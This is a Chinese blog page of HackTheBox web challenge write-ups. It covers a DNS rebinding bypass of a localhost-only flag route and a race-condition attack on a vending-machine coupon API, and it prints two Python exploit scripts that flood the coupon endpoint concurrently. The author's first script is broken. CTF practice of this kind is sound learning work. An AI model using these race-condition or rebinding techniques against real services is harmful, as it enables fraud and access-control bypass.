<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="keywords" content="Hexo Theme Keep">
    <meta name="description" content="且将新火试新茶，诗酒趁年华">
    <meta name="author" content="Drunkbaby">
    
    <title>
        
            HackTheBox之Web部分刷题记录 |
        
        Drunkbaby&#39;s Blog
    </title>
    
<link rel="stylesheet" href="/css/style.css">

    <link rel="shortcut icon" href="https://raw.githubusercontent.com/Drun1baby/CVE_Pentest/main/%E5%8F%8B%E9%93%BEimages/favicon.png">
    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/fontawesome.min.css">
    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/regular.min.css">
    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/solid.min.css">
    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/brands.min.css">
    <script id="hexo-configurations">
    let KEEP = window.KEEP || {}
    KEEP.hexo_config = {"hostname":"drun1baby.github.io","root":"/","language":"zh-CN","path":"search.json"}
    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":false,"init_open":true},"style":{"primary_color":"#0066cc","logo":"https://raw.githubusercontent.com/Drun1baby/CVE_Pentest/main/%E5%8F%8B%E9%93%BEimages/logo.png","favicon":"https://raw.githubusercontent.com/Drun1baby/CVE_Pentest/main/%E5%8F%8B%E9%93%BEimages/favicon.png","avatar":"https://raw.githubusercontent.com/Drun1baby/CVE_Pentest/main/%E5%8F%8B%E9%93%BEimages/favicon.png","font_size":"15px","font_family":null,"hover":{"shadow":true,"scale":true},"first_screen":{"enable":true,"header_transparent":true,"background_img":"/images/bg.svg","description":"且将新火试新茶，诗酒趁年华","font_color":null,"hitokoto":false},"scroll":{"progress_bar":true,"percent":false}},"local_search":{"enable":true,"preload":true},"code_copy":{},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"default"},"side_tools":{},"pjax":{"enable":true},"lazyload":{"enable":false},"comment":{"enable":true,"use":"valine","valine":{"enable":true,"appid":"mCIu9X4iLP3I0GikUoetB9bV-9Nh9j0Va","appkey":"ermlV1eoB1YODT088EdXjo6C","placeholder":"just go go","background":"/images/comment_bg.png","count":true},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.8"},"waline":{"server_url":null,"reaction":false,"version":2}},"post":{"author_label":{"enable":true,"auto":true,"custom_label_list":["Trainee","Engineer","Architect"]},"word_count":{"enable":true,"wordcount":true,"min2read":true},"img_align":"left","copyright_info":true},"version":"3.6.1"}
    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"}
    KEEP.language_code_block = {"copy":"复制代码","copied":"已复制","fold":"折叠代码块","folded":"已折叠"}
    KEEP.language_copy_copyright = {"copy":"复制版权信息","copied":"已复制","title":"原文标题","author":"原文作者","link":"原文链接"}
  </script>
<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="芜风" type="application/atom+xml">
</head>


<body>
<div class="progress-bar-container">
    
        <span class="scroll-progress-bar"></span>
    

    
        <span class="pjax-progress-bar"></span>
        <i class="pjax-progress-icon fas fa-circle-notch fa-spin"></i>
    
</div>


<main class="page-container">

    

    <div class="page-main-content">

        <div class="page-main-content-top">
            
<header class="header-wrapper">

    <div class="header-content">
        <div class="left">
            
                <a class="logo-image" href="/">
                    <img src="https://raw.githubusercontent.com/Drun1baby/CVE_Pentest/main/%E5%8F%8B%E9%93%BEimages/logo.png">
                </a>
            
            <a class="logo-title" href="/">
               Drunkbaby&#39;s Blog
            </a>
        </div>

        <div class="right">
            <div class="pc">
                <ul class="menu-list">
                    
                        <li class="menu-item">
                            <a class=""
                               href="/"
                            >
                                首页
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/archives"
                            >
                                归档
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/tags"
                            >
                                标签
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/categories"
                            >
                                分类
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/links"
                            >
                                友链
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/about"
                            >
                                关于
                            </a>
                        </li>
                    
                    
                        <li class="menu-item search search-popup-trigger">
                            <i class="fas fa-search"></i>
                        </li>
                    
                </ul>
            </div>
            <div class="mobile">
                
                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
                
                <div class="icon-item menu-bar">
                    <div class="menu-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <div class="header-drawer">
        <ul class="drawer-menu-list">
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/">首页</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/archives">归档</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/tags">标签</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/categories">分类</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/links">友链</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/about">关于</a>
                </li>
            
        </ul>
    </div>

    <div class="window-mask"></div>

</header>


        </div>

        <div class="page-main-content-middle">

            <div class="main-content">

                
                    <div class="fade-in-down-animation">
    <div class="post-page-container">
        <div class="article-content-container">

            <div class="article-title">
                <span class="title-hover-animation">HackTheBox之Web部分刷题记录</span>
            </div>

            
                <div class="article-header">
                    <div class="avatar">
                        <img src="https://raw.githubusercontent.com/Drun1baby/CVE_Pentest/main/%E5%8F%8B%E9%93%BEimages/favicon.png">
                    </div>
                    <div class="info">
                        <div class="author">
                            <span class="name">Drunkbaby</span>
                            
                                <span class="author-label">Lv6</span>
                            
                        </div>
                        <div class="meta-info">
                            
<div class="article-meta-info">
    <span class="article-date article-meta-item">
        
            <i class="fa-regular fa-calendar-plus"></i>&nbsp;
        
        <span class="pc">2022-07-20 17:42:20</span>
        <span class="mobile">2022-07-20 17:42</span>
    </span>
    
        <span class="article-update-date article-meta-item">
        <i class="fas fa-file-pen"></i>&nbsp;
        <span class="pc">2023-03-29 21:56:19</span>
    </span>
    
    
        <span class="article-categories article-meta-item">
            <i class="fas fa-folder"></i>&nbsp;
            <ul>
                
                    <li>
                        <a href="/categories/CTF/">CTF</a>&nbsp;
                    </li>
                
            </ul>
        </span>
    
    
        <span class="article-tags article-meta-item">
            <i class="fas fa-tags"></i>&nbsp;
            <ul>
                
                    <li>
                        <a href="/tags/CTF%E5%88%B7%E9%A2%98/">CTF刷题</a>&nbsp;
                    </li>
                
            </ul>
        </span>
    

    
    
        <span class="article-wordcount article-meta-item">
            <i class="fas fa-file-word"></i>&nbsp;<span>9.4k 字</span>
        </span>
    
    
        <span class="article-min2read article-meta-item">
            <i class="fas fa-clock"></i>&nbsp;<span>38 分钟</span>
        </span>
    
    
        <span class="article-pv article-meta-item">
            <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
        </span>
    
</div>

                        </div>
                    </div>
                </div>
            

            <div class="article-content keep-markdown-body">
                

                <p>HackTheBox之Web部分刷题记录</p>
<span id="more"></span>
<h1 id="Let’s-GO"><a href="#Let’s-GO" class="headerlink" title="Let’s GO!"></a>Let’s GO!</h1><h2 id="HackTheBox-AbuseHumanDB"><a href="#HackTheBox-AbuseHumanDB" class="headerlink" title="HackTheBox-AbuseHumanDB"></a>HackTheBox-AbuseHumanDB</h2><h3 id="0x01-初识靶场"><a href="#0x01-初识靶场" class="headerlink" title="0x01 初识靶场"></a>0x01 初识靶场</h3><p>靶场界面如图所示</p>
<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/AbuseHumanDB.png" class="">

<p>界面中让我们提交，存在虐待性质的网站，我这里直接输入 <code>http://baidu.com</code> 试一试。</p>
<p>一长串读条之后，出来了界面</p>
<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/BaiduInput.png" class="">

<p>不太懂，看一下源码吧。</p>
<h3 id="0x02-代码审计"><a href="#0x02-代码审计" class="headerlink" title="0x02 代码审计"></a>0x02 代码审计</h3><p>先打开路由中的 index.js，粗略看了一眼，全是 Return 错误的，或者是 403 的 …………</p>
<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/RouteIndexJS.png" class="">

<p>看到了 &#x2F;entries 的接口，会返回给我们前端的界面，访问一下 &#x2F;entries 的接口试试，看看会不会有什么意外的发现。</p>
<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/EntriesLike.png" class="">

<p>或许是 SQL 注入？尝试一下，分别尝试数字型注入与字符型注入</p>
<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/TryingSQLInjection.png" class="">

<p>失败了，再回去看看源码</p>
<p>在 database.js 里，进行了预编译，防止了 SQL 注入。</p>
<p>源码这里的第 6 - 7 行，主要是第 7 行，定义 isLocalhost 常数，若 <code>req.ip</code> 等于 127.0.0.1 且 <code>host</code> 等于 127.0.0.1:1337，那么值就为 0，否则为 1</p>
<p>太难了，懂原理之后再回来看</p>
<h2 id="HackTheBox-baby-CachedView"><a href="#HackTheBox-baby-CachedView" class="headerlink" title="HackTheBox-baby-CachedView"></a>HackTheBox-baby-CachedView</h2><h3 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h3><p>也做了好久的 HTB 题了，发现基本上题目的 DESCRIPTION 都没什么用，不过我也不能确定吧。<br>把一部分的 Challenge 刷完就准备去搞 Machine 了</p>
<h3 id="0x02-初识靶场"><a href="#0x02-初识靶场" class="headerlink" title="0x02 初识靶场"></a>0x02 初识靶场</h3><ul>
<li>靶场界面如图所示</li>
</ul>
<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/babyCachedView.png" class="">

<p>这里输入一个网站之后挺奇怪的，例如这里我输入 <code>https://google.com</code>，页面会一直加载，也不跳出 Google.com 的东西。如果用 Burpsuite 发包的话一开始 500 的状态码。</p>
<ul>
<li>后续页面出来了，如图所示</li>
</ul>
<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/GoogleSerlize.png" class="">

<p>点击 google.com 的超链接，可以跳转到 google.com，全无思路 ……</p>
<h3 id="0x03-源码阅读，代码审计"><a href="#0x03-源码阅读，代码审计" class="headerlink" title="0x03 源码阅读，代码审计"></a>0x03 源码阅读，代码审计</h3><p>一般拿到源码，都是先看路由，也就是看 route.py，如果在 Java 当中，路由一般都是 xxxController 类似的文件。</p>
<p>routes.py 文件夹中，第 18 - 21 行，是关于 flag 的，那我们这里直接访问 &#x2F;flag 的路由试一试。</p>
<p>可惜 403，被 Forbidden 了。</p>
<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/FlagRoute.png" class="">

<p>回去看源代码，这里还有一句关于 flag 的。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@web<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/flag'</span><span class="token punctuation">)</span>
<span class="token decorator annotation punctuation">@is_from_localhost</span>
<span class="token keyword">def</span> <span class="token function">flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
 <span class="token keyword">return</span> send_file<span class="token punctuation">(</span><span class="token string">'flag.png'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>点进 <code>@is_from_localhost</code> 这个函数，查看一下到底是什么情况。</p>
<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/JudgeLocalhostCode.png" class="">

<p>很简单，判断客户端的 IP 是不是等于 127.0.0.1，以及 Referer 的 IP 是否等于 127.0.0.1；若相等，则返回成功，若不相等，则返回 403</p>
<h3 id="0x04-解题"><a href="#0x04-解题" class="headerlink" title="0x04 解题"></a>0x04 解题</h3><ul>
<li>如果我本机直接起这个服务，肯定是能够得到 flag，但我希望不要以这种方式解出来，于是尝试伪造 Referer</li>
</ul>
<p>伪造了 Referer 和 remote_addr 无果，还是决定本地起这个服务。</p>
<p>教程可参考 <a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/galaxy3000/article/details/122956671" >HackTheBox-baby CachedView_galaxy3000的博客-CSDN博客<i class="fas fa-external-link-alt"></i></a><br>我自己没有做出来这种方法的，于是换了一种 DNS 重绑的做法。</p>
<ul>
<li>DNS 重绑，我个人感觉有点中间人攻击的样子，因为 IP 被重绑之后绕过了。原理图如下</li>
</ul>
<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/DnsRebinding.png" class="">

<p>工具网站如下<br><a class="link"   target="_blank" rel="noopener" href="https://lock.cmpxchg8b.com/rebinder.html" >https://lock.cmpxchg8b.com/rebinder.html<i class="fas fa-external-link-alt"></i></a></p>
<p>接着，我们输入题目对应的 IP 与 127.0.0.1 在框内</p>
<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/Rebinding.png" class="">

<p>再在题目的界面访问 <code>http://b280a398.7f000001.rbndr.us/flag</code></p>
<p>多刷几次，就能够看到 flag 的截图了，这里一定要耐心！</p>
<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/baby_CachedView_Flag.png" class="">

<p>Flag：HTB{reb1nd1ng_y0ur_dns_r3s0lv3r_0n3_qu3ry_4t_4_t1m3}</p>
<h2 id="HackTheBox-Diogenes’-Rage"><a href="#HackTheBox-Diogenes’-Rage" class="headerlink" title="HackTheBox-Diogenes’ Rage"></a>HackTheBox-Diogenes’ Rage</h2><h3 id="0x01-前言-1"><a href="#0x01-前言-1" class="headerlink" title="0x01 前言"></a>0x01 前言</h3><ul>
<li>搞开发真累 ………………</li>
</ul>
<h3 id="0x02-初识靶场-1"><a href="#0x02-初识靶场-1" class="headerlink" title="0x02 初识靶场"></a>0x02 初识靶场</h3><p>打开靶场后如图所示</p>
<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/DiogenesRageIndex.png" class="">

<p>下面有一张 1 dollar 的纸币，投进去之后可以点餐，简而言之这是一个自助贩卖机。</p>
<p>抓包之后看了，感觉没有什么明显的逻辑漏洞，看源码。</p>
<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/SeeResponse.png" class="">

<h3 id="0x03-代码审计"><a href="#0x03-代码审计" class="headerlink" title="0x03 代码审计"></a>0x03 代码审计</h3><ul>
<li>还是老样子，先看路由</li>
</ul>
<p>路由的第 23 - 44 行出现了 flag</p>
<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/FlagJudge.png" class="">

<p>前提条件是我们在自助贩卖机下输入的商品号是 C8，可是 C8 的价格是 13 多 dollar。再看看其他的代码，寻找思路。感觉有两种思路</p>
<h4 id="思路一、修改-apply-进去的数，使得钱够付"><a href="#思路一、修改-apply-进去的数，使得钱够付" class="headerlink" title="思路一、修改 apply 进去的数，使得钱够付"></a>思路一、修改 apply 进去的数，使得钱够付</h4><p>尝试了连续发包，但 JWT 始终会变，username 也一直在变，不太好搞；在投入纸币的时候账户上会多一块钱。而我们在同一时间发起多个请求，就可以把优惠券的价格猛地飙上来，从而凑够购买 C8 的资金</p>
<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/JWTDiff.png" class="">

<h4 id="思路二、修改货物的价格"><a href="#思路二、修改货物的价格" class="headerlink" title="思路二、修改货物的价格"></a>思路二、修改货物的价格</h4><p>货物没有价格，只有对应的 item，item 对应的是 SQL 语句，SQL 语句是预编译写的，不存在 SQL 注入</p>
<blockquote>
<p>确定下来思路，走思路一</p>
</blockquote>
<h3 id="0x04-构造异步发包的-exp"><a href="#0x04-构造异步发包的-exp" class="headerlink" title="0x04 构造异步发包的 exp"></a>0x04 构造异步发包的 exp</h3><p>前文我们说了，每次我们投入纸币的时候，JWT 会新建一个用户，这样的话会导致原本我们的攻击思路泡汤，所以此时我们必须要传进去用户的 token 才可以；构造一下 exp</p>
<p>API 请求的顺序如下所示。</p>
<ol>
<li>使用 &#x2F;api&#x2F;purchase 获取用户 Session。</li>
<li>同时在多个进程中运行 &#x2F;api&#x2F;coupons&#x2F;apply。</li>
<li>使用 &#x2F;api&#x2F;purchase 购买 C8。如果购买成功，则 cat flag</li>
</ol>
<p>这里还有一个原因是利用了竞争条件，也就是 Race Condition，竞争条件不再展开，可以移步至我博客<a class="link"   target="_blank" rel="noopener" href="https://withd-raw.github.io/2022/01/29/PortSwigger-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/#toc-heading-11" >PortSwigger-文件上传 | 芜风<i class="fas fa-external-link-alt"></i></a></p>
<p>1.购买商品时，Cookie 可以通过注册用户发出。<br>2. 优惠券发放时出现争用情况。</p>
<p>为什么 <strong>#1</strong> 很重要，因为如果我们在没有用户会话的情况下执行 <strong>#2</strong>，则可以调用 registerUser 功能并每次在新会话中颁发优惠券，因此我们无法将优惠券复制到一个帐户。<br>因此，需要先运行 Buy Stuff API 来获取用户会话。</p>
<h4 id="写-exp"><a href="#写-exp" class="headerlink" title="写 exp"></a>写 exp</h4><p>最开始我写的 exp，太菜了hh</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> multiprocessing
<span class="token keyword">import</span> requests

url_user <span class="token operator">=</span> <span class="token string">'http://206.189.26.20:30831/api/coupons/apply'</span>
headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36 Edg/100.0.1185.39'</span><span class="token punctuation">&#125;</span>
data_sendBill <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"coupon_code"</span><span class="token punctuation">:</span><span class="token string">"HTB_100"</span><span class="token punctuation">&#125;</span>
res_getusername <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url_user<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> json<span class="token operator">=</span> data_sendBill<span class="token punctuation">)</span>
cookies <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'session'</span><span class="token punctuation">:</span>res_getusername<span class="token punctuation">.</span>cookies<span class="token punctuation">[</span><span class="token string">'session'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span>
t <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">:</span>

t<span class="token punctuation">.</span>append<span class="token punctuation">(</span>multiprocessing<span class="token punctuation">.</span>Process<span class="token punctuation">(</span>target<span class="token operator">=</span>exploit<span class="token punctuation">,</span>args<span class="token operator">=</span><span class="token punctuation">(</span>cookies<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> j <span class="token keyword">in</span> t<span class="token punctuation">:</span>
 j<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> k <span class="token keyword">in</span> t<span class="token punctuation">:</span>
 k<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>
url_buy <span class="token operator">=</span> <span class="token string">'http://206.189.26.20:30831/api/purchase'</span>
data_PayBill <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"item"</span><span class="token punctuation">:</span><span class="token string">"C8"</span><span class="token punctuation">&#125;</span>
res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url_buy<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> json<span class="token operator">=</span> data_PayBill<span class="token punctuation">,</span> cookies <span class="token operator">=</span> cookies<span class="token punctuation">)</span>
json_result <span class="token operator">=</span> res<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">try</span><span class="token punctuation">:</span>
 <span class="token keyword">if</span> json_result<span class="token punctuation">[</span><span class="token string">'flag'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
 <span class="token keyword">print</span><span class="token punctuation">(</span>json_result<span class="token punctuation">[</span><span class="token string">'flag'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">except</span> KeyError <span class="token keyword">as</span> e<span class="token punctuation">:</span>
 <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'failed : '</span> <span class="token operator">+</span> json_result<span class="token punctuation">[</span><span class="token string">'message'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>后面看了大佬的 exp，我这里挂一下</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> multiprocessing
<span class="token keyword">import</span> requests
<span class="token keyword">import</span> time

<span class="token keyword">def</span> <span class="token function">exploit</span><span class="token punctuation">(</span>u<span class="token punctuation">,</span> d<span class="token punctuation">,</span> h<span class="token punctuation">)</span><span class="token punctuation">:</span>
 <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
 requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>u<span class="token punctuation">,</span> data<span class="token operator">=</span>d<span class="token punctuation">,</span> headers<span class="token operator">=</span>h<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">perform_transactions</span><span class="token punctuation">(</span>cookie<span class="token punctuation">,</span> u<span class="token punctuation">)</span><span class="token punctuation">:</span>
 url <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"http://206.189.26.20:30831/api/coupons/apply"</span></span>
 data <span class="token operator">=</span> <span class="token string">'&#123;"coupon_code":"HTB_100"&#125;'</span>
 thread <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
 headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"Content-Type"</span> <span class="token punctuation">:</span> <span class="token string">"application/json"</span><span class="token punctuation">&#125;</span>
 headers<span class="token punctuation">[</span><span class="token string">'Cookie'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"session="</span><span class="token operator">+</span>cookie
 start <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
 <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
 p1 <span class="token operator">=</span> multiprocessing<span class="token punctuation">.</span>Process<span class="token punctuation">(</span>target<span class="token operator">=</span>exploit<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token punctuation">,</span> headers<span class="token punctuation">)</span><span class="token punctuation">)</span>
 thread<span class="token punctuation">.</span>append<span class="token punctuation">(</span>p1<span class="token punctuation">)</span>
 <span class="token keyword">for</span> j <span class="token keyword">in</span> thread<span class="token punctuation">:</span>
 j<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>
 <span class="token keyword">for</span> k <span class="token keyword">in</span> thread<span class="token punctuation">:</span>
 k<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>
 end <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
 <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>end <span class="token operator">-</span> start<span class="token punctuation">:</span><span class="token format-spec">.5f</span><span class="token punctuation">&#125;</span></span><span class="token string"> sec"</span></span><span class="token punctuation">)</span>
 <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Done!!"</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">get_session</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>
 u <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"http://206.189.26.20:30831/api/purchase"</span></span>
 d <span class="token operator">=</span> <span class="token string">'&#123;"item":"A2"&#125;'</span>
 res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>u<span class="token punctuation">,</span> data<span class="token operator">=</span>d<span class="token punctuation">)</span>
 <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
 <span class="token keyword">return</span> res<span class="token punctuation">.</span>cookies<span class="token punctuation">[</span><span class="token string">'session'</span><span class="token punctuation">]</span>

<span class="token keyword">def</span> <span class="token function">get_flag</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> url<span class="token punctuation">)</span><span class="token punctuation">:</span>
 u <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"http://206.189.26.20:30831/api/purchase"</span></span>
 d <span class="token operator">=</span> <span class="token string">'&#123;"item":"C8"&#125;'</span>
 headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"Content-Type"</span> <span class="token punctuation">:</span> <span class="token string">"application/json"</span><span class="token punctuation">&#125;</span>
 headers<span class="token punctuation">[</span><span class="token string">'Cookie'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"session="</span><span class="token operator">+</span>s
 d1 <span class="token operator">=</span> <span class="token string">'&#123;"item":"A1"&#125;'</span>
 res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>u<span class="token punctuation">,</span> data<span class="token operator">=</span>d1<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>
 <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
 res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>u<span class="token punctuation">,</span> data<span class="token operator">=</span>d<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>
 <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
 <span class="token keyword">return</span> res<span class="token punctuation">.</span>cookies
<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
 <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
 u <span class="token operator">=</span> <span class="token string">"URLSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS"</span>
 s <span class="token operator">=</span> get_session<span class="token punctuation">(</span>u<span class="token punctuation">)</span>
 perform_transactions<span class="token punctuation">(</span>s<span class="token punctuation">,</span> u<span class="token punctuation">)</span>
 res <span class="token operator">=</span> get_flag<span class="token punctuation">(</span>s<span class="token punctuation">,</span> u<span class="token punctuation">)</span>
 time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
